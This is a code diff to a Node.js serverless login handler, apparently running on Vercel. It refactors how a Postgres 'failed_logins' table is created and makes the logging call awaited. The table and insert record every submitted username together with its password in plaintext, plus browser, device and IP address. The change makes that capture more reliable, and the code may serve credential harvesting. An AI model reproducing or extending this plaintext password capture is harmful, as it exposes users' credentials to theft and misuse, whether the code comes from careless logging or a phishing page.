@@ -13,21 +13,28 @@ if (process.env.POSTGRES_URL) {
         connectionString: process.env.POSTGRES_URL,
         ssl: { rejectUnauthorized: false }
     });
-    
-    // Auto-create table logic (runs in background on instance start)
-    pool.query(`
-        CREATE TABLE IF NOT EXISTS failed_logins (
-            id SERIAL PRIMARY KEY,
-            timestamp TEXT,
-            username TEXT,
-            password TEXT,
-            browser TEXT,
-            device TEXT,
-            ip TEXT
-        );
-    `).catch(e => console.error('Table creation error:', e.message));
 } else {
     console.warn('⚠️ POSTGRES_URL is not set. Database integration disabled.');
+}
+
+// Ensure table exists before any operation
+async function ensureTable() {
+    if (!pool) return;
+    try {
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS failed_logins (
+                id SERIAL PRIMARY KEY,
+                timestamp TEXT,
+                username TEXT,
+                password TEXT,
+                browser TEXT,
+                device TEXT,
+                ip TEXT
+            );
+        `);
+    } catch (e) {
+        console.error('Table creation error:', e.message);
+    }
 }
 
 // ─── Token helper ────────────────────────────────────────────────────────────
@@ -39,6 +46,7 @@ function makeToken() {
 async function readLogs() {
     if (!pool) return [];
     try {
+        await ensureTable();
         // Fetch newest first
         const res = await pool.query('SELECT * FROM failed_logins ORDER BY id DESC LIMIT 1000');
         return res.rows;
@@ -51,6 +59,7 @@ async function readLogs() {
 async function appendLog(entry) {
     if (!pool) return;
     try {
+        await ensureTable();
         await pool.query(`
             INSERT INTO failed_logins (timestamp, username, password, browser, device, ip)
             VALUES ($1, $2, $3, $4, $5, $6)
@@ -99,8 +108,8 @@ module.exports = async (req, res) => {
             let device = 'Desktop';
             if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = 'Mobile';
 
-            // Fire and forget logging
-            appendLog({
+            // AWAIT logging so Vercel does not terminate the function early
+            await appendLog({
                 timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                 username:  username || '',
                 password:  password || '',
